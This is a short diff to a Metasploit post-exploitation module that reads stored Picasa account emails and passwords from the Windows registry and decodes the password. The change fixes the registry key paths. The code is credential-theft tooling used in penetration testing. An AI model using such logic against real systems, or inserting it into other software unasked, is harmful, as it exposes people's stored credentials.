@@ -81,8 +81,8 @@ class MetasploitModule < Msf::Post
   def get_registry
     print_status('Looking in registry for stored login passwords by Picasa ...')
 
-    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaEmail') || ''
-    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaPass') || ''
+    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences', 'GaiaEmail') || ''
+    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences', 'GaiaPass') || ''
 
     credentials = Rex::Text::Table.new(
       'Header' => 'Picasa Credentials',
@@ -109,8 +109,8 @@ class MetasploitModule < Msf::Post
     end
 
     # For early versions of Picasa3
-    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaEmail') || ''
-    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaPass') || ''
+    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences', 'GaiaEmail') || ''
+    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences', 'GaiaPass') || ''
 
     if !username.empty? && !password.empty?
       passbin = [password].pack('H*')
